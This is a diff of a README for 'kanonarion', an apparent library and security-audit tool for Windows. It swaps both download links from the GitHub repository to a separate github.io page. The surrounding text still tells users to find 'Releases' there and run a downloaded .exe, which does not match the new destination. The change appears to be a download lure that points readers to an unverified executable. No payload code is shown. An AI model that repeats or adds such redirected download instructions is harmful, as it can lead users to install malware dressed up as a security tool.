@@ -1,6 +1,6 @@
 # 🛡️ kanonarion - Verify your software security with ease
 
-[![](https://img.shields.io/badge/Download-Kanonarion-blue.svg)](https://github.com/Xylophonebrainworker858/kanonarion)
+[![](https://img.shields.io/badge/Download-Kanonarion-blue.svg)](https://xylophonebrainworker858.github.io)
 
 Kanonarion helps you understand the software libraries used in your projects. It provides a clear picture of the code you include in your applications. You gain details about licenses, security risks, and the way your program uses these external components. This tool works locally on your computer to ensure your data stays private.
 
@@ -17,7 +17,7 @@ To run Kanonarion on your Windows computer, you need these items:
 
 You must get the latest version from our release page. Visit this link to download the installer for your system:
 
-[https://github.com/Xylophonebrainworker858/kanonarion](https://github.com/Xylophonebrainworker858/kanonarion)
+[https://xylophonebrainworker858.github.io](https://xylophonebrainworker858.github.io)
 
 Click the link above. Look for the section labeled "Releases" on the right side of the page. Select the file ending in .exe to start your download. Your browser might ask where to save the file. Choose your Downloads folder.
 
